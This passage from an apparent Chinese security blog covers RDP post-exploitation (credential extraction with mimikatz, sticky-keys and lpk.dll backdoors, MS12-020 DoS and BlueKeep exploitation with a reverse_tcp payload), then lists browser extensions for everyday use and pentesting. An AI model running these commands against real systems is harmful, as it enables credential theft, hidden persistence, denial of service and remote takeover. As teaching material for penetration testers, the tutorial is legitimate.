Client\Servers</code></p><p>就能够获得已登录用户的远程桌面连接历史记录：</p><blockquote><p>如果第三个用户未登录，此时是无法直接获得该用户的注册表信息的，会报错，也就无法直接导出该用户的远程桌面连接历史记录。</p></blockquote><p>最后给出一个三好学生写的枚举脚本：</p><pre class="line-numbers language-none"><code class="language-none">$AllUser = Get-WmiObject -Class Win32_UserAccountforeach($User in $AllUser){$RegPath = "Registry::HKEY_USERS\"+$User.SID+"\Software\Microsoft\Terminal Server Client\Servers\"Write-Host "User:"$User.NameWrite-Host "SID:"$User.SIDWrite-Host "Status:"$User.StatusTry  { $QueryPath = dir $RegPath -Name -ErrorAction Stop}Catch{Write-Host "No RDP Connections History"Write-Host "----------------------------------"continue}foreach($Name in $QueryPath){   Try  {  $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHintWrite-Host "Server:"$NameWrite-Host "User:"$User}Catch  {Write-Host "No RDP Connections History"}}Write-Host "----------------------------------" }<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="导出所有用户的历史记录"><a href="#导出所有用户的历史记录" class="headerlink" title="导出所有用户的历史记录"></a>导出所有用户的历史记录</h2><p>前面刚说了，对于未登录用户，无法直接获得注册表配置信息，那有什么解决办法？其实这里可以通过加载配置单元的方式来解决，即打开用户的 NTUSER.DAT 文件，加载配置单元导入用户配置信息，然后进行枚举。</p><p>选中 HKEY_USERS 项，点击“文件” —&gt; “加载配置单元”，如下图：</p><p>选择打开用户的 NTUSER.DAT 文件，</p><p>路径为<code>C:\Documents and Settings\用户名\NTUSER.DAT</code></p><p>接着指定一个项名称，即可在 HKEY_USERS 下读取该用户的注册表配置信息</p><p>此外，也可以通过命令行实现加载配置单元的实例：</p><pre class="line-numbers language-none"><code class="language-none">Reg load HKEY_USERS\testmoretz C:\Documents and Settings\moretz\NTUSER.DAT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后给出一个三好学生写的枚举脚本：<br><a href="https://github.com/3gstudent/List-RDP-Connections-History">https://github.com/3gstudent/List-RDP-Connections-History</a></p><h1 id="十二、获取本地保存的RDP密码"><a href="#十二、获取本地保存的RDP密码" class="headerlink" title="十二、获取本地保存的RDP密码"></a>十二、获取本地保存的RDP密码</h1><p>在获取内网机器管理员权限后，查看是否有保存到本地的RDP连接密码，对保存到本地的RDP连接密码进行解密，解密成功后可使用此凭据继续横向移动。</p><h2 id="基本信息获取"><a href="#基本信息获取" class="headerlink" title="基本信息获取"></a>基本信息获取</h2><p>Windows保存RDP凭据的目录是：<br><code>C:\Users\用户名\AppData\Local\Microsoft\Credentials</code></p><h3 id="查看保存在本地的远程主机信息"><a href="#查看保存在本地的远程主机信息" class="headerlink" title="查看保存在本地的远程主机信息"></a>查看保存在本地的远程主机信息</h3><p><code>cmdkey /list</code><br>注意:cmdkey /list命令务必在Session会话下执行，system下执行无结果。</p><p>或者使用powerpick查看<br><code>powerpick Get-ChildItem C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\ -Force</code></p><p>查看本地用户此目录下是否存有RDP密码文件,这条命令只能在cmd中执行!!! powershell无法使用<br><code>dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</code>  </p><h3 id="查看连接记录"><a href="#查看连接记录" class="headerlink" title="查看连接记录"></a>查看连接记录</h3><p>查看本地机器本地连接过的目标机器。</p><pre class="line-numbers language-none"><code class="language-none">reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以使用三好学生的ps脚本<br><a href="https://github.com/3gstudent/List-RDP-Connections-History">https://github.com/3gstudent/List-RDP-Connections-History</a></p><h2 id="获取本地保存的RDP密码"><a href="#获取本地保存的RDP密码" class="headerlink" title="获取本地保存的RDP密码"></a>获取本地保存的RDP密码</h2><h3 id="一、mimikatz"><a href="#一、mimikatz" class="headerlink" title="一、mimikatz"></a>一、mimikatz</h3><pre class="line-numbers language-none"><code class="language-none">// 选择一个密码文件对其进行解密，获取guidMasterKey和pbData的值，// pbData是我们要解密的数据，guidMasterKey是解密所需要的密钥。// 待会要通过guidMasterKey找对应的Masterkey。// SESSIONID 即为  %userprofile%\AppData\Local\Microsoft\Credentials\  目录下的一个文件夹名mimikatz # dpapi::cred /in:C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\SESSIONIDeg:mimikatz # privilege::debugmimikatz # dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\8781378F7D47006A4FC98D2F8A266F58// 如果你没有获得到解码凭证则需要手动携带Masterkey// 根据guidMasterKey找到对应的Masterkey,这里LSASS已经在其缓存中存有这个key因此我们可以使用SeDebugPrivilege获取。mimikatz # sekurlsa::dpapi// 通过Masterkey解密出明文RDP连接密码。mimikatz "dpapi::cred /in:C:\Users\USERNAME\Desktop\test\SESSION /masterkey:GUID key对应的masterkey"eg:mimikatz "dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\8781378F7D47006A4FC98D2F8A266F58 /masterkey:1df6b7a86b7aa3238c6899b1b4fd7b4ccba852db9b2ea611bbb7943f34b788f55d27835591ccde1e6c643d9aca724fd495282f5fc92ee80746262d8759b9d23d"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二、netpass"><a href="#二、netpass" class="headerlink" title="二、netpass"></a>二、netpass</h3><p>nirsoft密码恢复工具介绍：<a href="https://www.nirsoft.net/password_recovery_tools.html">nirsoft</a>  </p><p>全套工具下载  <a href="https://www.nirsoft.net/protected_downloads/passreccommandline.zip">https://www.nirsoft.net/protected_downloads/passreccommandline.zip</a><br>用户名：download  密码：nirsoft123!    解压密码：nirsoft123!</p><p>netpass下载<br>x86<br><a href="https://www.nirsoft.net/toolsdownload/netpass.zip">https://www.nirsoft.net/toolsdownload/netpass.zip</a><br>x64<br><a href="https://www.nirsoft.net/toolsdownload/netpass-x64.zip">https://www.nirsoft.net/toolsdownload/netpass-x64.zip</a>  </p><p>使用：<br>双击netpass.exe</p><h3 id="三、其他"><a href="#三、其他" class="headerlink" title="三、其他"></a>三、其他</h3><p>powershell脚本自动化解密…</p><h1 id="十三、与远程桌面相关的权限维持方法"><a href="#十三、与远程桌面相关的权限维持方法" class="headerlink" title="十三、与远程桌面相关的权限维持方法"></a>十三、与远程桌面相关的权限维持方法</h1><h2 id="Windows-系统隐藏账户"><a href="#Windows-系统隐藏账户" class="headerlink" title="Windows 系统隐藏账户"></a>Windows 系统隐藏账户</h2><p>利用工具： </p><ul><li><p><a href="https://github.com/3gstudent/Windows-User-Clone">3gstudent/Windows-User-Clone: Create a hidden account</a></p></li><li><p><a href="https://github.com/An0nySec/ShadowUser">https://github.com/An0nySec/ShadowUser</a></p></li></ul><p>详情参考： <a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F">渗透技巧——Windows系统的帐户隐藏</a></p><h2 id="Windows-粘滞键与辅助功能后门"><a href="#Windows-粘滞键与辅助功能后门" class="headerlink" title="Windows 粘滞键与辅助功能后门"></a>Windows 粘滞键与辅助功能后门</h2><p>参考文章：<a href="https://www.cnblogs.com/BOHB-yunying/p/11695140.html">https://www.cnblogs.com/BOHB-yunying/p/11695140.html</a>    </p><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><p>Metasploit 中的<code>post/windows/manage/sticky_keys</code>模块可实现自动化地利用沾滞键的权限维持技术。  </p><p>该模块将用 cmd.exe 替换那些辅助功能的二进制文件（sethc、osk、disp、utilman）：</p><p>使用方法如下：</p><pre class="line-numbers language-none"><code class="language-none">use post/windows/manage/sticky_keysset session 6set target UTILMANexploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>此时，我们开启目标主机的远程桌面，当我们点击左下角的辅助功能按钮后，成功弹出了 CMD 窗口，并且为 SYSTEM 权限的：</p><p>不仅是 CMD，我们还可以换成任意的 Payload 用于钓鱼，当受害者使用响应功能时便会触发 Payload 实施攻击。</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>如果你在电脑上连按五次 shift 键，你就会发现电脑屏幕上弹出了一个叫做 “粘滞键” 的程序，</p><p>在不知道用户账户密码，没有登录进系统之前，连按五次 shift 键也可以弹出这个程序，也称之为shift后门</p><p>但是首先得需要进入远程桌面登录界面，需要关闭鉴权和securitylayer验证，参考本文开篇。</p><p>粘滞键程序名称为 “sethc.exe”，其路径为 “c:\windows\system32\sethc.exe”。</p><p>**类似程序 **</p><ul><li><p>放大镜 Magnify.exe   win 和 + 同时按</p></li><li><p>讲述人 Narrator.exe  win 和 enter 同时按</p></li></ul><h3 id="制作过程"><a href="#制作过程" class="headerlink" title="制作过程"></a>制作过程</h3><p>利用粘滞键做后门是一种比较常见的持续控制方法。其基本流程如下：</p><blockquote><p>首先，我们手动或利用工具，找到 sethc.exe 将其删除或改名为 sethc.exe.bak(非必要)</p><p>接着将 cmd.exe 程序复制一个副本，并命名为 “sethc.exe”，替换原来的sethc.exe</p><p>最后，重启计算机再次按下 5 次 Shift 键时，就会弹出 CMD 界面，后门制作成功。</p></blockquote><p>制作的方法如下，在目标主机上执行如下命令即可：</p><pre class="line-numbers language-none"><code class="language-none">// 将sethc.exe重命名备份move C:\WINDOWS\system32\sethc.exe C:\WINDOWS\system32\sethc.exe.bak  // 将一个cmd.exe副本保存伪装成sethc.execopy C:\WINDOWS\system32\cmd.exe C:\windows\system32\sethc.exe       <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，我们打开目标主机的远程桌面，连续按下五次 shift 键，便可以看到目标主机屏幕上成功弹出了一个 CMD 窗口</p><p>一般情况下，即使是 SYSTEM 权限也是无法修改 sethc.exe 的，只有 TrustedInstaller 权限才可以。</p><p><strong>解决办法一：</strong> </p><p>修改的文件右击 –&gt; 属性 –&gt; 安全 –&gt; 高级 –&gt; 更改所有者 –&gt; 当前用户 –&gt; 确定 –&gt; 重复之前步骤知道高级 –&gt; 编辑权限为完全控制</p><p><strong>解决办法二：</strong> </p><p>出现这样的情况我们就需要将将权限目录下的所有文件及文件夹、子文件夹下的所有者更改为管理员组(administrators)命令</p><pre class="line-numbers language-none"><code class="language-none">takeown /f c:\windows\system32\*.*   /a /r /d y// 目录下的文件、子文件夹的NTFS权限修改为仅管理员组(administrators)完全控制cacls  c:\windows\system32\*.*  /T /E /G administrators:F// 如果提权后是system权限，需要在转化cacls  c:\windows\system32\*.*  /T /E /G system:F<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>解决办法三：</strong> </p><p>模拟一个 TrustedInstaller 权限的令牌获取 TrustedInstaller 权限，然后再执行上述操作。我们的思路如下：</p><p>当我们启动 TrustedInstaller 服务时， 会启动进程 TrustedInstaller.exe，</p><p>该程序的权限为 NT SERVICE\TrustedInstaller，那么我们就可以窃取该进程的令牌。</p><p>首先进入 shell 启动 TrustedInstaller 服务：</p><pre class="line-numbers language-none"><code class="language-none">sc.exe start TrustedInstaller       # 先进入shell启动TrustedInstaller服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后执行如下即可：</p><pre class="line-numbers language-none"><code class="language-none">use incognitops      # 找到TrustedInstaller的进程PID，这里为3476steal_token &lt;PID&gt;      # 从该进程中窃取令牌getuid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>此时便可以对 sethc.exe 进行任何操作了。</p><h2 id="Lpk后门"><a href="#Lpk后门" class="headerlink" title="Lpk后门"></a>Lpk后门</h2><blockquote><p>一般系统都存在lpk.dll文件，该文件位于C:\WINDOWS\system32和C:WINDOWS\system\dllcache目录下。当exe文件运行时，lpk.dll就会被Windows动态链接，系统会先从当前目录查找，然后在到系统目录查找并加载。下面使用工具生成木马并保存为lpk.dll。我们要做的就是替换系统的lpk.dll文件。</p></blockquote><p>将这个文件替换系统自带的文件，并按5次shift键，系统就会运行sethc.exe程序，进而lpk.dll就会被Windows动态链接，</p><p>同时按下我们设置的键(我设置的是65和83，即一起按下AS键)，输入我们设置的密码，</p><p>最终弹出我们的shell窗口，添加账号后即可登录。</p><p><img src="https://mochazz.github.io/img/shift/s4.png"></p><h1 id="十四、与远程桌面相关的漏洞"><a href="#十四、与远程桌面相关的漏洞" class="headerlink" title="十四、与远程桌面相关的漏洞"></a>十四、与远程桌面相关的漏洞</h1><h2 id="DOS-攻击"><a href="#DOS-攻击" class="headerlink" title="DOS 攻击"></a>DOS 攻击</h2><p>这一利用借助的是 2012 年爆出来的 MS12-020 远程桌面协议 RDP 远程代码执行漏洞（CVE-2012-0002）。  </p><p>该漏洞是由于 Windows 在处理某些对象时存在错误，可通过特制的 RDP 报文访问未初始化或已经删除的对象，导致任意代码执行</p><p>在 Metasploit 中有两个该漏洞的利用模块：</p><p>首先为了确定目标主机是否容易受到该漏洞的影响，可以先使用第二个命令来进行检测：</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary/scanner/rdp/ms12_020_checkset rhosts 192.168.93.20set rport 3389exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>目标机存在漏洞，然后尝试使用第一个模块进行攻击，这将对目标系统发起 DOS 攻击，最终导致目标系统蓝屏：</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary/dos/windows/rdp/ms12_020_maxchannelidsset rhosts 192.168.93.20set rport 3389exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>从上图中可以看到目标系统是由于某些问题导致系统正在关闭。DoS 攻击执行者通常攻击托管在诸如银行或信用卡支付网关等高端 Web 服务器上的站点或服务，通过暂时或无限期地中断连接 Internet 的主机服务，使其目标用户无法使用机器或网络资源。</p><h2 id="CVE-2019-0708"><a href="#CVE-2019-0708" class="headerlink" title="CVE-2019-0708"></a>CVE-2019-0708</h2><p>2019 年 5 月 14 日微软官方发布安全补丁，修复了 Windows 远程桌面服务的远程代码执行漏洞（CVE-2019-0708），该高危漏洞利用方式是通过远程桌面端口 3389，RDP 协议进行攻击的。</p><p>此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与 2017 年 WannaCry 恶意软件的传播方式类似。</p><p>它影响了某些旧版本的 Windows 系统，包括：  </p><ul><li>Windows 7</li><li>Windows server 2008 R2</li><li>Windows server 2008</li><li> Windows 2003</li><li>Windows xp</li></ul><p>在 Metasploit 中已经有了该漏洞的利用模块：</p><p>第一个模块用来检测目标机是否存在漏洞，第二个模块用来进行攻击。设置好参数直接利用即可：</p><pre class="line-numbers language-none"><code class="language-none">use exploit/windows/rdp/cve_2019_0708_bluekeep_rceset payload windows/x64/meterpreter/reverse_tcpset rhosts 192.168.93.20set lhost 192.168.93.128set rdp_client_ip 192.168.93.20unset RDP_CLIENT_NAMset target 2    # 这里的 2 代表目标机为虚拟机环境exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651126707&amp;idx=1&amp;sn=4a98914e6d423af388e4c1747e5c64d5">内网渗透测试：初探远程桌面的安全问题</a></p><p><a href="https://blog.csdn.net/wudinaniya/article/details/80978436">出现身份验证错误，要求的函数不受支持</a></p><p><a href="https://xz.aliyun.com/t/9673">后渗透之权限维持 – 隐藏用户的创建和使用 - 先知社区</a></p><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8E%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E5%87%AD%E6%8D%AE">渗透技巧——从远程桌面客户端提取明文凭据</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 知识总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RDP安全 </tag>
            
            <tag> 远程桌面 </tag>
            
            <tag> 知识总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器插件分享</title>
      <link href="posts/29501.html"/>
      <url>posts/29501.html</url>
      
        <content type="html"><![CDATA[<p>分享几款日常使用较多的浏览器插件和一些常用于渗透测试的浏览器插件</p><p>更多好玩的插件请查看：<a href="https://github.com/zhaoolee/ChromeAppHeroes">Chrome插件英雄榜</a></p><h3 id="日常使用"><a href="#日常使用" class="headerlink" title="日常使用"></a>日常使用</h3><h4 id="Surfingkeys"><a href="#Surfingkeys" class="headerlink" title="Surfingkeys"></a>Surfingkeys</h4><p>下载地址：<br><a href="https://microsoftedge.microsoft.com/addons/detail/surfingkeys/kgnghhfkloifoabeaobjkgagcecbnppg">https://microsoftedge.microsoft.com/addons/detail/surfingkeys/kgnghhfkloifoabeaobjkgagcecbnppg</a>  </p><h4 id="扩展管理器（Extension-Manager）"><a href="#扩展管理器（Extension-Manager）" class="headerlink" title="扩展管理器（Extension Manager）"></a>扩展管理器（Extension Manager）</h4><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/extension-manager/gjldcdngmdknpinoemndlidpcabkggco">https://chrome.google.com/webstore/detail/extension-manager/gjldcdngmdknpinoemndlidpcabkggco</a></p><h4 id="OneTab-Extension"><a href="#OneTab-Extension" class="headerlink" title="OneTab Extension"></a>OneTab Extension</h4><p>下载地址：<br><a href="https://microsoftedge.microsoft.com/addons/detail/onetab-extension/kgimkccmplbmlalhblhncbecfgijcigm">https://microsoftedge.microsoft.com/addons/detail/onetab-extension/kgimkccmplbmlalhblhncbecfgijcigm</a>  </p><h4 id="清除历史记录和Web缓存"><a href="#清除历史记录和Web缓存" class="headerlink" title="清除历史记录和Web缓存"></a>清除历史记录和Web缓存</h4><p>下载地址：<br><a href="https://microsoftedge.microsoft.com/addons/detail/clear-history-web-cache/ojilnhojiihncgjnnpphppnmflflhbcg">https://microsoftedge.microsoft.com/addons/detail/clear-history-web-cache/ojilnhojiihncgjnnpphppnmflflhbcg</a></p><h4 id="AdBlock插件"><a href="#AdBlock插件" class="headerlink" title="AdBlock插件"></a>AdBlock插件</h4><p>这是一款参考各种广告过滤插件开发的功能全面的免费开源广告过滤工具，可以过滤掉网页上的大部分广告：浮动广告，购物广告，恶意弹窗，跟踪代码，这款插件适用于过滤国内网站的广告，国外网站的广告建议使用AdBlock插件。</p><h4 id="简悦-SimpRead"><a href="#简悦-SimpRead" class="headerlink" title="简悦 - SimpRead"></a>简悦 - SimpRead</h4><p>让你瞬间进入沉浸式阅读的 Edge 扩展，类似 Safari 的阅读模式。</p><p>下载地址<br><a href="https://microsoftedge.microsoft.com/addons/detail/%E7%AE%80%E6%82%A6-simpread/clgdhlhfiocphghdkdbgdlmfaafccfmc">简悦 - SimpRead - Microsoft Edge Addons</a></p><h4 id="沙拉查词-聚合词典划词翻译"><a href="#沙拉查词-聚合词典划词翻译" class="headerlink" title="沙拉查词-聚合词典划词翻译"></a>沙拉查词-聚合词典划词翻译</h4><p>Saladict 沙拉查词是一款专业划词翻译扩展，为交叉阅读而生。大量权威词典涵盖中英日韩法德西语，支持复杂的划词操作、网页翻译、生词本与 PDF 浏览。</p><p>下载地址<br><a href="https://microsoftedge.microsoft.com/addons/detail/%E6%B2%99%E6%8B%89%E6%9F%A5%E8%AF%8D%E8%81%9A%E5%90%88%E8%AF%8D%E5%85%B8%E5%88%92%E8%AF%8D%E7%BF%BB%E8%AF%91/idghocbbahafpfhjnfhpbfbmpegphmmp">https://microsoftedge.microsoft.com/addons/detail/%E6%B2%99%E6%8B%89%E6%9F%A5%E8%AF%8D%E8%81%9A%E5%90%88%E8%AF%8D%E5%85%B8%E5%88%92%E8%AF%8D%E7%BF%BB%E8%AF%91/idghocbbahafpfhjnfhpbfbmpegphmmp</a></p><h4 id="Tampermonkey"><a href="#Tampermonkey" class="headerlink" title="Tampermonkey"></a>Tampermonkey</h4><p>懂的都懂</p><p>脚本推荐：</p><ul><li><p><a href="https://greasyfork.org/zh-CN/scripts/24508-userscript-show-site-all-userjs">Userscript+ : 显示当前网站所有可用的UserJS脚本 Jaeger</a></p></li><li><p><a href="https://greasyfork.org/zh-CN/scripts/2998-search-by-image">Search By Image | 以图搜图</a></p></li></ul><h4 id="谷歌上网助手"><a href="#谷歌上网助手" class="headerlink" title="谷歌上网助手"></a>谷歌上网助手</h4><p>这是一款专门为科研、外贸、跨境电商、海淘人员、开发人员服务的上网加速工具，Chrome内核浏览器专用，可以解决Chrome扩展无法自动更新问题，一键安装，无需其他配置即可访问以下服务，但是会与“Proxy SwitchyOmega”这类代理插件冲突。</p><ul><li>Google搜索：<a href="https://www.google.com/">https://www.google.com</a></li><li>Gmail邮箱：<a href="https://mail.google.com/">https://mail.google.com</a></li><li>Chrome商店访问以及Google+等服务等。</li></ul><h4 id="类似的网站-发现相关网站"><a href="#类似的网站-发现相关网站" class="headerlink" title="类似的网站 - 发现相关网站"></a>类似的网站 - 发现相关网站</h4><p>立即发现与您当前正在浏览的网站类似的网站。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/similar-sites-discover-re/necpbmbhhdiplmfhmjicabdeighkndkn">类似的网站 - 发现相关网站 - Chrome 网上应用店 (google.com)</a></p><h4 id="百度文库免费下载"><a href="#百度文库免费下载" class="headerlink" title="百度文库免费下载"></a>百度文库免费下载</h4><p>这是一款百度文档免下载券下载文档的插件，可以导出PDF文字和图片，能屏蔽文档中的广告，支持Word、PPT、PDF文档，只要能试读的页面都能下载到，能分页下载完整的文档，非常稳定可靠</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/%E7%99%BE%E5%BA%A6%E6%96%87%E5%BA%93%E5%85%8D%E8%B4%B9%E4%B8%8B%E8%BD%BD/imjoocoajfjgnabmlbgpcnpieibibhmd">百度文库免费下载 - Chrome 网上应用店 (google.com)</a></p><h4 id="Desktop-Messenger-for-Telegram"><a href="#Desktop-Messenger-for-Telegram" class="headerlink" title="Desktop Messenger for Telegram"></a>Desktop Messenger for Telegram</h4><p>这是一款非官方开发和维护的Telegram Web客户端插件，可直接通过点击插件图标来进行登录和收发信息，有好友发送信息时也会有消息通知。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/desktop-messenger-for-tel/dafiggkhlbbhfcpgggcfeeoliillkabn">Desktop Messenger for Telegram™ - Chrome 网上应用店 (google.com)</a></p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h4><p>这个插件可以自动探测当前网站所属的国家、城市，解析 IP 地址以及开放的服务和端口，包括但不限于 FTP、DNS、SSH 或者其他服务等，属被动信息搜集中的一种。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap">Shodan - Chrome 网上应用店</a></p><h4 id="Wappalyzer"><a href="#Wappalyzer" class="headerlink" title="Wappalyzer"></a>Wappalyzer</h4><p>这个插件可用于指纹识别，能够检测出当前网站使用的 Web 框架和 CMS、CDN、统计、中间件、编程语言以及 JavaScript 框架和库等等相关信息。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg">Wappalyzer - Chrome 网上应用店</a></p><h4 id="FOFA-Pro-View"><a href="#FOFA-Pro-View" class="headerlink" title="FOFA Pro View"></a>FOFA Pro View</h4><p>这个插件比 Shodan 搜集到的信息更全，能够检测出当前网站的托管位置（国家 / 地区 / 城市）、组织、ASN、端口、协议和相关资产等信息。</p><p>项目地址：https : //github.com/fofapro/fofa_view</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/fofa-pro-view/dobbfkjhgbkmmcooahlnllfopfmhcoln">FOFA Pro View - Chrome 网上应用店</a></p><h4 id="IP-DNS-amp-Security-Tools"><a href="#IP-DNS-amp-Security-Tools" class="headerlink" title="IP, DNS &amp; Security Tools"></a>IP, DNS &amp; Security Tools</h4><p>这个插件是直接调用 <a href="https://hackertarget.com/">https://hackertarget.com</a> 官网接口来进行查询的，如果长时间不出查询结果时可能就得上 “墙” 了，可查询的信息包括有：IP、路由、DNS、Whios、指纹、HTTP 头、同服等。</p><h4 id="IP-Address-and-Domain-Information"><a href="#IP-Address-and-Domain-Information" class="headerlink" title="IP Address and Domain Information"></a>IP Address and Domain Information</h4><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/ip-address-and-domain-inf/lhgkegeccnckoiliokondpaaalbhafoa">https://chrome.google.com/webstore/detail/ip-address-and-domain-inf/lhgkegeccnckoiliokondpaaalbhafoa</a></p><h4 id="anti-honeypot"><a href="#anti-honeypot" class="headerlink" title="anti-honeypot"></a>anti-honeypot</h4><p>用来检测 WEB 蜜罐并中断请求，能够识别并中断长亭 D-sensor 和墨安幻阵的部分溯源 API。</p><p>项目地址：<a href="https://github.com/Ar3h/anti-honeypot">https://github.com/Ar3h/anti-honeypot</a></p><h3 id="改包发包"><a href="#改包发包" class="headerlink" title="改包发包"></a>改包发包</h3><h4 id="HackBar"><a href="#HackBar" class="headerlink" title="HackBar"></a>HackBar</h4><p>这个插件可用于常见编码 / 解码、POST/Cookies 数据提交、SQL/XSS/LFI/XXE 漏洞测试、自定义 Referer/User-Agent 等，是一款不可多得的渗透测试人员必备插件，虽然现在作者已经收费了，但还是能够绕过其限制的。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc">https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc</a></p><h4 id="DenisPodgurskii-pentestkit"><a href="#DenisPodgurskii-pentestkit" class="headerlink" title="DenisPodgurskii/pentestkit"></a>DenisPodgurskii/pentestkit</h4><p>下载地址：<br><a href="https://github.com/DenisPodgurskii/pentestkit">https://github.com/DenisPodgurskii/pentestkit</a></p><h4 id="Penetration-Testing-Kit"><a href="#Penetration-Testing-Kit" class="headerlink" title="Penetration Testing Kit"></a>Penetration Testing Kit</h4><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/penetration-testing-kit/ojkchikaholjmcnefhjlbohackpeeknd">https://chrome.google.com/webstore/detail/penetration-testing-kit/ojkchikaholjmcnefhjlbohackpeeknd</a></p><h4 id="HTTP-Header-Live"><a href="#HTTP-Header-Live" class="headerlink" title="HTTP Header Live"></a>HTTP Header Live</h4><p>这个插件可用于捕获网页中加载的全部网页流量数据包，并且支持编辑和重发，就是 UI 差了点，大部分的同类插件都只能查看，不能编辑和重放。</p><h3 id="辅助工具"><a href="#辅助工具" class="headerlink" title="辅助工具"></a>辅助工具</h3><h4 id="Hack-Tools"><a href="#Hack-Tools" class="headerlink" title="Hack-Tools"></a>Hack-Tools</h4><p>payload快速生成，编码解码</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/d3coder/gncnbkghencmkfgeepfaonmegemakcol">d3coder - Chrome 网上应用店 (google.com)</a></p><h4 id="d3coder"><a href="#d3coder" class="headerlink" title="d3coder"></a>d3coder</h4><p>这个插件可用于各种类型的编码和解码，例如 URI、Hex、Base64，Rot13 或 Unix 时间戳等编码之间的相互转换。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/d3coder/gncnbkghencmkfgeepfaonmegemakcol">d3coder - Chrome 网上应用店 (google.com)</a></p><h4 id="Set-Character-Encoding"><a href="#Set-Character-Encoding" class="headerlink" title="Set Character Encoding"></a>Set Character Encoding</h4><p>这个插件可用来修改当前浏览器的编码，当浏览器编码与网页编码不一致时就会出现乱码的情况，最后吐槽一下这个新版谷歌浏览器的编码设置是真不好找。</p><p><a href="https://chrome.google.com/webstore/detail/set-character-encoding/bpojelgakakmcfmjfilgdlmhefphglae">Set Character Encoding - Chrome 网上应用店 (google.com)</a></p><p><a href="https://chrome.google.com/webstore/detail/charset/oenllhgkiiljibhfagbfogdbchhdchml">Charset - Chrome 网上应用店 (google.com)</a></p><h4 id="EditThisCookie"><a href="#EditThisCookie" class="headerlink" title="EditThisCookie"></a>EditThisCookie</h4><p>这个插件可以帮助我们轻松管理谷歌浏览器上的各种 Cookies，支持添加，删除，编辑，搜索，锁定、屏蔽、保护和拦截 Cookies！</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg">EditThisCookie - Chrome 网上应用店 (google.com)</a></p><p><a href="https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm">Cookie-Editor - Chrome 网上应用店 (google.com)</a></p><h4 id="X-Forwarded-For-Header"><a href="#X-Forwarded-For-Header" class="headerlink" title="X-Forwarded-For Header"></a>X-Forwarded-For Header</h4><p>请求ip伪造</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/x-forwarded-for-header/hkghghbnihliadkabmlcmcgmffllglin">X-Forwarded-For Header - Chrome 网上应用店 (google.com)</a></p><h4 id="Proxy-SwitchyOmega"><a href="#Proxy-SwitchyOmega" class="headerlink" title="Proxy SwitchyOmega"></a>Proxy 